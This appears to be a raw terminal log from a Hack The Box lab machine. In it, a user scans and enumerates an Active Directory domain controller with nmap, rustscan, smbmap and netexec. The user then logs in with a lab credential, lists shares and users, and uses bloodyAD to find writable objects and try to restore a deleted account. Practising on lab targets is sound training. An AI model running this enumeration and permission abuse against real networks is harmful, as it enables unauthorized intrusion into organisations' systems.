  File "pyimod02_importers.py", line 457, in exec_module
  File "nxc/connection.py", line 22, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 457, in exec_module
  File "nxc/helpers/pfx.py", line 38, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 457, in exec_module
  File "oscrypto/keys.py", line 5, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 457, in exec_module
  File "oscrypto/_asymmetric.py", line 9, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 457, in exec_module
  File "oscrypto/_asn1.py", line 7, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 457, in exec_module
  File "asn1crypto/cms.py", line 58, in <module>
  File "<frozen importlib._bootstrap>", line 1360, in _find_and_load
  File "<frozen importlib._bootstrap>", line 1331, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 935, in _load_unlocked
  File "pyimod02_importers.py", line 446, in exec_module
  File "pyimod02_importers.py", line 383, in _check_name_wrapper
  File "pyimod02_importers.py", line 503, in get_code
  File "pyimod01_archive.py", line 134, in extract
KeyboardInterrupt
[PYI-17708:ERROR] Failed to execute script 'netexec' due to unhandled exception!

 ✘  Thu 18 Jun - 10:05  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nxc ldap $ip -u user -p password 
LDAP        10.129.5.103    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.5.103    389    DC01             [-] checkpoint.htb\user:password 

 Thu 18 Jun - 10:06  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap -Pn $ip --script=smb-enum*             
zsh: no matches found: --script=smb-enum*

 ✘  Thu 18 Jun - 10:11  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap --script=smb-enum* $ip    
zsh: no matches found: --script=smb-enum*

 ✘  Thu 18 Jun - 10:12  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap --script=smb-enum $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:12 +0530
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:829: 'smb-enum' did not match a category, filename, or directory
stack traceback:
	[C]: in function 'error'
	/usr/bin/../share/nmap/nse_main.lua:829: in local 'get_chosen_scripts'
	/usr/bin/../share/nmap/nse_main.lua:1364: in main chunk
	[C]: in ?

QUITTING!

 ✘  Thu 18 Jun - 10:12  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap --script=smb-enum $ip 
[sudo] password for user: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:12 +0530
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:829: 'smb-enum' did not match a category, filename, or directory
stack traceback:
	[C]: in function 'error'
	/usr/bin/../share/nmap/nse_main.lua:829: in local 'get_chosen_scripts'
	/usr/bin/../share/nmap/nse_main.lua:1364: in main chunk
	[C]: in ?

QUITTING!

 ✘  Thu 18 Jun - 10:12  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap --script=smb-enum* $ip 
zsh: no matches found: --script=smb-enum*

 ✘  Thu 18 Jun - 10:12  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap --script=smb-vuln* $ip 
zsh: no matches found: --script=smb-vuln*

 ✘  Thu 18 Jun - 10:13  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap --script=smb-vuln $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:13 +0530
NSE: failed to initialize the script engine:
/usr/bin/../share/nmap/nse_main.lua:829: 'smb-vuln' did not match a category, filename, or directory
stack traceback:
	[C]: in function 'error'
	/usr/bin/../share/nmap/nse_main.lua:829: in local 'get_chosen_scripts'
	/usr/bin/../share/nmap/nse_main.lua:1364: in main chunk
	[C]: in ?

QUITTING!

 ✘  Thu 18 Jun - 10:13  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  cat /usr/bin/n              
named*                           netstat*                         nfs-cp                           nl-route-add*                    nstat*                         
named-checkconf*                 nettle-hash*                     nfs-ls                           nl-route-delete*                 nsupdate*                      
named-checkzone*                 nettle-lfib-stream*              nfs-stat                         nl-route-get*                    ntfs-3g*                       
named-compilezone*               nettle-pbkdf2*                   nft*                             nl-route-list*                   ntfs-3g.probe*                 
named-journalprint*              netview.py*                      ngettext*                        nl-rule-list*                    ntfscat*                       
named-nzd2nzf*                   network2john@                    ngramX*                          nl-tctree-list*                  ntfsclone*                     
named-rrchecker*                 networkctl*                      ngrep*                           nl-util-addr*                    ntfscluster*                   
namei*                           NetworkManager*                  nice*                            nm*                              ntfscmp*                       
nameif*                          newgidmap*                       nick2ldif*                       nmap*                            ntfscp*                        
nano*                            newgrp*                          nikto*                           nm-applet*                       ntfsdecrypt*                   
nasm*                            newuidmap*                       ninja*                           nmbd*                            ntfsfix*                       
nautilus*                        newusers*                        nl*                              nmblookup*                       ntfsinfo*                      
nautilus-autorun-software*       nfbpf_compile*                   nl-addr-add*                     nmcli*                           ntfslabel*                     
nbtscan*                         nfc-anticol*                     nl-addr-delete*                  nm-connection-editor*            ntfsls*                        
nc*                              nfc-barcode*                     nl-addr-list*                    nm-online*                       ntfs-read.py*                  
ncat*                            nfc-dep-initiator*               nl-class-add*                    nmtui*                           ntfsrecover*                   
ncdu*                            nfc-dep-target*                  nl-class-delete*                 nmtui-connect@                   ntfsresize*                    
nc.openbsd@                      nfc-emulate-forum-tag2*          nl-classid-lookup*               nmtui-edit@                      ntfssecaudit*                  
ncrack*                          nfc-emulate-forum-tag4*          nl-class-list*                   nmtui-hostname@                  ntfstruncate*                  
ncursesw6-config*                nfc-emulate-tag*                 nl-cls-add*                      node*                            ntfsundelete*                  
ndisasm*                         nfc-emulate-uid*                 nl-cls-delete*                   node-gyp@                        ntfsusermap*                   
ndpexhaust26*                    nfc-jewel*                       nl-cls-list*                     node_query6*                     ntfswipe*                      
ndpexhaust6*                     nfc-list*                        nl-fib-lookup*                   nohup*                           ntlm_auth*                     
ndptool*                         nfc-mfclassic*                   nl-link-enslave*                 nokfw*                           ntlmrelayx.py*                 
ndrdump*                         nfc-mfsetuid*                    nl-link-ifindex2name*            nologin*                         ntpshmmon*                     
neato@                           nfc-mfultralight*                nl-link-list*                    nonce2key*                       numactl*                       
neo2john@                        nfc-poll*                        nl-link-name2ifindex*            nop*                             numademo*                      
neon-config*                     nfc-read-forum-tag3*             nl-link-release*                 nopt@                            numastat*                      
neotoppm*                        nfc-relay*                       nl-link-set*                     normalizer*                      numbers2csv*                   
neqn*                            nfc-relay-picc*                  nl-link-stats*                   not*                             numbers2raw*                   
net*                             nfc-scan-device*                 nl-list-caches*                  not-21@                          numbers2text*                  
netcap*                          nf-ct-add*                       nl-list-sockets*                 notify-send*                     numfmt*                        
netcat@                          nf-ct-events*                    nl-monitor*                      nping*                           numpy-config*                  
netexec*                         nf-ct-list*                      nl-neigh-add*                    npm@                             nvptx-arch*                    
netntlm@                         nf-exp-add*                      nl-neigh-delete*                 nproc*                           nvtop*                         
net.py*                          nf-exp-delete*                   nl-neigh-list*                   npx@                             nwg-displays*                  
netscreen@                       nf-exp-list*                     nl-neightbl-list*                nroff*                           nwg-displays-apply*            
netshaper*                       nf-log*                          nl-nh-list*                      nsec3hash*                       nwg-displays-toggle-wallpapers*
netsniff-ng*                     nf-monitor*                      nl-pktloc-lookup*                nsenter*                         nwg-look*                      
net-snmp-cert*                   nfnl_osf*                        nl-qdisc-add*                    nslookup*                        nxc@                           
net-snmp-config*                 nf-queue*                        nl-qdisc-delete*                 nspr-config*                                                    
net-snmp-create-v3-user*         nfs-cat                          nl-qdisc-list*                   nss-config*                                                     


 Thu 18 Jun - 10:14  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo nmap --script=smb-vuln* $ip 
zsh: no matches found: --script=smb-vuln*

 ✘  Thu 18 Jun - 10:14  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbclient -L \\\\$ip\\          
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\user]:
session setup failed: NT_STATUS_ACCESS_DENIED

 ✘  Thu 18 Jun - 10:15  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbmap -H $ip
zsh: command not found: smbmap

 ✘  Thu 18 Jun - 10:15  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo pacman -S smbmap            
resolving dependencies...
looking for conflicting packages...

Package (3)                 New Version              Net Change  Download Size

extra/python-configupdater  3.2-3                      0.36 MiB       0.06 MiB
extra/python-termcolor      3.3.0-1                    0.04 MiB       0.01 MiB
blackarch/smbmap            1:v1.10.8.r0.g31b8a8f-1    0.13 MiB       0.04 MiB

Total Download Size:   0.11 MiB
Total Installed Size:  0.54 MiB

:: Proceed with installation? [Y/n] y
:: Retrieving packages...
 python-termcolor-3.3.0-1-any                                                13.1 KiB  96.6 KiB/s 00:00 [--------------------------------------------------------------] 100%
 python-configupdater-3.2-3-any                                              64.1 KiB   393 KiB/s 00:00 [--------------------------------------------------------------] 100%
 smbmap-1:v1.10.8.r0.g31b8a8f-1-any                                          36.6 KiB  30.1 KiB/s 00:01 [--------------------------------------------------------------] 100%
 Total (3/3)                                                                113.8 KiB  70.5 KiB/s 00:02 [--------------------------------------------------------------] 100%
(3/3) checking keys in keyring                                                                          [--------------------------------------------------------------] 100%
(3/3) checking package integrity                                                                        [--------------------------------------------------------------] 100%
(3/3) loading package files                                                                             [--------------------------------------------------------------] 100%
(3/3) checking for file conflicts                                                                       [--------------------------------------------------------------] 100%
(3/3) checking available disk space                                                                     [--------------------------------------------------------------] 100%
:: Processing package changes...
(1/3) installing python-configupdater                                                                   [--------------------------------------------------------------] 100%
(2/3) installing python-termcolor                                                                       [--------------------------------------------------------------] 100%
(3/3) installing smbmap                                                                                 [--------------------------------------------------------------] 100%
:: Running post-transaction hooks...
(1/1) Arming ConditionNeedsUpdate...

 Thu 18 Jun - 10:15  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  smbmap -H $ip        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.8 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                                                                    
[*] Closed 0 connections                                                                                                                                               

 Thu 18 Jun - 10:25  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap --script smb-enum-shares -p 139,445 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:25 +0530
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.17 seconds

 Thu 18 Jun - 10:25  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nbtscan -v -h $IP
Usage:
nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(<scan_range>) 
	-v		verbose output. Print all names received
			from each host
	-d		dump packets. Print whole packet contents.
	-e		Format output in /etc/hosts format.
	-l		Format output in lmhosts format.
			Cannot be used with -v, -s or -h options.
	-t timeout	wait timeout milliseconds for response.
			Default 1000.
	-b bandwidth	Output throttling. Slow down output
			so that it uses no more that bandwidth bps.
			Useful on slow links, so that ougoing queries
			don't get dropped.
	-r		use local port 137 for scans. Win95 boxes
			respond to this only.
			You need to be root to use this option on Unix.
	-q		Suppress banners and error messages,
	-s separator	Script-friendly output. Don't print
			column and record headers, separate fields with separator.
	-h		Print human-readable names for services.
			Can only be used with -v option.
	-m retransmits	Number of retransmits. Default 0.
	-f filename	Take IP addresses to scan from file filename.
			-f - makes nbtscan take IP addresses from stdin.
	<scan_range>	what to scan. Can either be single IP
			like 192.168.1.1 or
			range of addresses in one of two forms: 
			xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.
Examples:
	nbtscan -r 192.168.1.0/24
		Scans the whole C-class network.
	nbtscan 192.168.1.25-137
		Scans a range from 192.168.1.25 to 192.168.1.137
	nbtscan -v -s : 192.168.1.0/24
		Scans C-class network. Prints results in script-friendly
		format using colon as field separator.
		Produces output like that:
		192.168.0.1:NT_SERVER:00U
		192.168.0.1:MY_DOMAIN:00G
		192.168.0.1:ADMINISTRATOR:03U
		192.168.0.2:OTHER_BOX:00U
		...
	nbtscan -f iplist
		Scans IP addresses specified in file iplist.

 ✘  Thu 18 Jun - 10:27  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nbtscan -v -h $ip
Doing NBT name scan for addresses from 10.129.5.103


 Thu 18 Jun - 10:27  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.5.103    445    DC01             [*] Enumerated shares
SMB         10.129.5.103    445    DC01             Share           Permissions     Remark
SMB         10.129.5.103    445    DC01             -----           -----------     ------
SMB         10.129.5.103    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.5.103    445    DC01             C$                              Default share
SMB         10.129.5.103    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.5.103    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.5.103    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.5.103    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.5.103    445    DC01             VMBackups                       

 Thu 18 Jun - 10:34  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap -p 445 --script smb-enum-users $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:37 +0530
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.13 seconds

 Thu 18 Jun - 10:37  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  nmap -Pn -p 445 --script smb-enum-users $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-18 10:37 +0530
Nmap scan report for checkpoint.htb (10.129.5.103)
Host is up (0.21s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 3.85 seconds

 Thu 18 Jun - 10:37  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  rustscan $ip          
error: unexpected argument '10.129.5.103' found

Usage: rustscan [OPTIONS] [-- <COMMAND>...]

For more information, try '--help'.

 ✘  Thu 18 Jun - 10:39  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  rustscan -a $ip 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/home/user/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.5.103:53
Open 10.129.5.103:88
Open 10.129.5.103:135
Open 10.129.5.103:139
Open 10.129.5.103:389
Open 10.129.5.103:445
Open 10.129.5.103:464
Open 10.129.5.103:593
Open 10.129.5.103:636
Open 10.129.5.103:3268
Open 10.129.5.103:3269
Open 10.129.5.103:5985
Open 10.129.5.103:9389

^C

 ✘  Thu 18 Jun - 10:41  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users

SMB         10.129.5.103    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.5.103    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.5.103    445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.5.103    445    DC01             Administrator                 2026-05-09 16:16:34 0       Built-in account for administering the computer/domain 
SMB         10.129.5.103    445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.5.103    445    DC01             krbtgt                        2026-05-09 08:41:01 0       Key Distribution Center Service Account 
SMB         10.129.5.103    445    DC01             alex.turner                   2026-05-09 09:00:08 0        
SMB         10.129.5.103    445    DC01             ryan.brooks                   2026-05-10 13:46:18 0        
SMB         10.129.5.103    445    DC01             svc_deploy                    2026-05-09 09:01:19 0       Deployment service account 
SMB         10.129.5.103    445    DC01             james.harper                  2026-05-09 09:02:53 0        
SMB         10.129.5.103    445    DC01             sarah.mitchell                2026-05-09 09:02:58 0        
SMB         10.129.5.103    445    DC01             emily.carter                  2026-05-09 09:03:05 0        
SMB         10.129.5.103    445    DC01             david.reynolds                2026-05-09 09:03:11 0        
SMB         10.129.5.103    445    DC01             jessica.coleman               2026-05-09 09:03:15 0        
SMB         10.129.5.103    445    DC01             lauren.flores                 2026-05-09 09:03:21 0        
SMB         10.129.5.103    445    DC01             michael.torres                2026-05-09 09:03:28 0        
SMB         10.129.5.103    445    DC01             kevin.patterson               2026-05-09 09:03:33 0        
SMB         10.129.5.103    445    DC01             brian.jenkins                 2026-05-09 09:03:37 0        
SMB         10.129.5.103    445    DC01             megan.perry                   2026-05-09 09:03:42 0        
SMB         10.129.5.103    445    DC01             max.palmer                    2026-05-26 01:25:15 0        
SMB         10.129.5.103    445    DC01             [*] Enumerated 17 local users: CHECKPOINT

 Thu 18 Jun - 10:42  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  bloodyAD --host 10.129.5.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
zsh: command not found: bloodyAD

 ✘  Thu 18 Jun - 10:43  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo pacman -S bloodyAD
[sudo] password for user: 
error: target not found: bloodyAD

 ✘  Thu 18 Jun - 10:44  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  sudo pacman -S bloodyad
resolving dependencies...
looking for conflicting packages...

Package (1)         New Version             Net Change  Download Size

blackarch/bloodyad  1:2.5.4.r10.gd1f3a5c-1    0.43 MiB       0.11 MiB

Total Download Size:   0.11 MiB
Total Installed Size:  0.43 MiB

:: Proceed with installation? [Y/n] y 
:: Retrieving packages...
 bloodyad-1:2.5.4.r10.gd1f3a5c-1-any                                        110.8 KiB  55.3 KiB/s 00:02 [--------------------------------------------------------------] 100%
(1/1) checking keys in keyring                                                                          [--------------------------------------------------------------] 100%
(1/1) checking package integrity                                                                        [--------------------------------------------------------------] 100%
(1/1) loading package files                                                                             [--------------------------------------------------------------] 100%
(1/1) checking for file conflicts                                                                       [--------------------------------------------------------------] 100%
(1/1) checking available disk space                                                                     [--------------------------------------------------------------] 100%
:: Processing package changes...
(1/1) installing bloodyad                                                                               [--------------------------------------------------------------] 100%
Processing ./.
  Installing build dependencies: started
  Installing build dependencies: finished with status 'done'
  Getting requirements to build wheel: started
  Getting requirements to build wheel: finished with status 'done'
  Preparing metadata (pyproject.toml): started
  Preparing metadata (pyproject.toml): finished with status 'done'
Collecting asn1crypto==1.5.1 (from bloodyAD==2.5.4)
  Downloading asn1crypto-1.5.1-py2.py3-none-any.whl.metadata (13 kB)
Collecting badldap>=0.7.5 (from bloodyAD==2.5.4)
  Downloading badldap-0.7.5-py3-none-any.whl.metadata (1.1 kB)
Collecting cryptography==44.0.2 (from bloodyAD==2.5.4)
  Downloading cryptography-44.0.2-cp39-abi3-manylinux_2_34_x86_64.whl.metadata (5.7 kB)
Collecting kerbad>=0.5.10 (from bloodyAD==2.5.4)
  Downloading kerbad-0.5.10-py3-none-any.whl.metadata (885 bytes)
Collecting winacl==0.1.9 (from bloodyAD==2.5.4)
  Downloading winacl-0.1.9-py3-none-any.whl.metadata (458 bytes)
Collecting cffi>=1.12 (from cryptography==44.0.2->bloodyAD==2.5.4)
  Downloading cffi-2.0.0-cp314-cp314-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting unicrypto>=0.0.12 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading unicrypto-0.0.12-py3-none-any.whl.metadata (386 bytes)
Collecting badauth>=0.1.6 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading badauth-0.1.6-py3-none-any.whl.metadata (854 bytes)
Collecting asysocks>=0.2.18 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading asysocks-0.2.18-py3-none-any.whl.metadata (435 bytes)
Collecting prompt-toolkit>=3.0.2 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading prompt_toolkit-3.0.52-py3-none-any.whl.metadata (6.4 kB)
Collecting tqdm (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading tqdm-4.68.3-py3-none-any.whl.metadata (57 kB)
Collecting wcwidth (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading wcwidth-0.8.1-py3-none-any.whl.metadata (43 kB)
Collecting tabulate (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading tabulate-0.10.0-py3-none-any.whl.metadata (40 kB)
Collecting unidns>=0.0.3 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading unidns-0.0.4-py3-none-any.whl.metadata (468 bytes)
Collecting dnspython>=2.7.0 (from badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading dnspython-2.8.0-py3-none-any.whl.metadata (5.7 kB)
Collecting h11>=0.14.0 (from asysocks>=0.2.18->badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading h11-0.16.0-py3-none-any.whl.metadata (8.3 kB)
Collecting pycparser (from cffi>=1.12->cryptography==44.0.2->bloodyAD==2.5.4)
  Downloading pycparser-3.0-py3-none-any.whl.metadata (8.2 kB)
Collecting six (from kerbad>=0.5.10->bloodyAD==2.5.4)
  Downloading six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)
Collecting pycryptodomex (from unicrypto>=0.0.12->badldap>=0.7.5->bloodyAD==2.5.4)
  Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Downloading asn1crypto-1.5.1-py2.py3-none-any.whl (105 kB)
Downloading cryptography-44.0.2-cp39-abi3-manylinux_2_34_x86_64.whl (4.2 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.2/4.2 MB 11.4 MB/s  0:00:00
Downloading winacl-0.1.9-py3-none-any.whl (89 kB)
Downloading badldap-0.7.5-py3-none-any.whl (369 kB)
Downloading asysocks-0.2.18-py3-none-any.whl (149 kB)
Downloading badauth-0.1.6-py3-none-any.whl (116 kB)
Downloading cffi-2.0.0-cp314-cp314-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
Downloading dnspython-2.8.0-py3-none-any.whl (331 kB)
Downloading h11-0.16.0-py3-none-any.whl (37 kB)
Downloading kerbad-0.5.10-py3-none-any.whl (164 kB)
Downloading prompt_toolkit-3.0.52-py3-none-any.whl (391 kB)
Downloading unicrypto-0.0.12-py3-none-any.whl (75 kB)
Downloading unidns-0.0.4-py3-none-any.whl (15 kB)
Downloading pycparser-3.0-py3-none-any.whl (48 kB)
Downloading pycryptodomex-3.23.0-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 14.0 MB/s  0:00:00
Downloading six-1.17.0-py2.py3-none-any.whl (11 kB)
Downloading tabulate-0.10.0-py3-none-any.whl (39 kB)
Downloading tqdm-4.68.3-py3-none-any.whl (78 kB)
Downloading wcwidth-0.8.1-py3-none-any.whl (323 kB)
Building wheels for collected packages: bloodyAD
  Building wheel for bloodyAD (pyproject.toml): started
  Building wheel for bloodyAD (pyproject.toml): finished with status 'done'
  Created wheel for bloodyAD: filename=bloodyad-2.5.4-py3-none-any.whl size=117557 sha256=5db39d52cafd8023457426304e6e05d39c03fcb3fb7ada02a00c69a5240b9144
  Stored in directory: /tmp/pip-ephem-wheel-cache-sw750q36/wheels/08/8c/57/05e40cab210add2059ea4b4a3c63c7442ad8978d939228b887
Successfully built bloodyAD
Installing collected packages: asn1crypto, wcwidth, tqdm, tabulate, six, pycryptodomex, pycparser, h11, dnspython, unicrypto, prompt-toolkit, cffi, cryptography, winacl, asysocks, unidns, kerbad, badauth, badldap, bloodyAD

Successfully installed asn1crypto-1.5.1 asysocks-0.2.18 badauth-0.1.6 badldap-0.7.5 bloodyAD-2.5.4 cffi-2.0.0 cryptography-44.0.2 dnspython-2.8.0 h11-0.16.0 kerbad-0.5.10 prompt-toolkit-3.0.52 pycparser-3.0 pycryptodomex-3.23.0 six-1.17.0 tabulate-0.10.0 tqdm-4.68.3 unicrypto-0.0.12 unidns-0.0.4 wcwidth-0.8.1 winacl-0.1.9

[notice] A new release of pip is available: 26.1.1 -> 26.1.2
[notice] To update, run: pip install --upgrade pip
:: Running post-transaction hooks...
(1/1) Arming ConditionNeedsUpdate...

 Thu 18 Jun - 10:44  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  bloodyad --host 10.129.5.103 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

 Thu 18 Jun - 10:45  ~/Documents/CTFs/HTB/Checkpoint   origin ☊ main 2☀ 
 @user  bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

Traceback (most recent call last):
  File "/usr/share/bloodyad/bloodyAD.py", line 5, in <module>
    main.main()
    ~~~~~~~~~^^
  File "/usr/share/bloodyad/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 204, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/runners.py", line 127, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.14/asyncio/base_events.py", line 719, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/usr/share/bloodyad/bloodyAD/main.py", line 232, in amain
    conn = ConnectionHandler(args=args)
